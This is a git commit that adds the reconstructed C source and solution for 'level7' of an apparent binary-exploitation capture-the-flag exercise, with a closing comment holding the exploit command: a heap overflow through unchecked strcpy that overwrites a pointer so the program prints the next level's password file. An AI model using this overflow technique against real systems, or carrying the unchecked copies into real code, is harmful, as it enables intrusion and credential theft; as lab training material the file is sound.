07f3ff2150d7a13ed6e224ea5752d4ce208bf5e0
julienhache <julienhache7@gmail.com>
2020-01-07 19:31:19 +0100

    Add level7 solution.

---
+++ level7/source.c
@@ -0,0 +1,35 @@
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <time.h>
+
+char	*c = "";// buffer with unknown size
+
+void	m(void)
+{
+	printf("%s - %d\n", c, time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+	int	*ptr1;
+	int	*ptr2;
+
+	ptr1 = malloc(8);
+	*ptr1 = 1;
+	((void**)ptr1)[1] = malloc(8);
+
+	ptr2 = malloc(8);
+	*ptr2 = 2;
+	((void**)ptr2)[1] = malloc(8);
+
+	strcpy((char*)ptr1[1], argv[1]);
+	strcpy((char*)ptr2[1], argv[2]);
+
+	fgets(c, 68, fopen( "/home/user/level8/.pass", "r"));
+	puts("~~");
+}
+
+/*
+./level7 `python -c "print 'a' * 20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
+*/
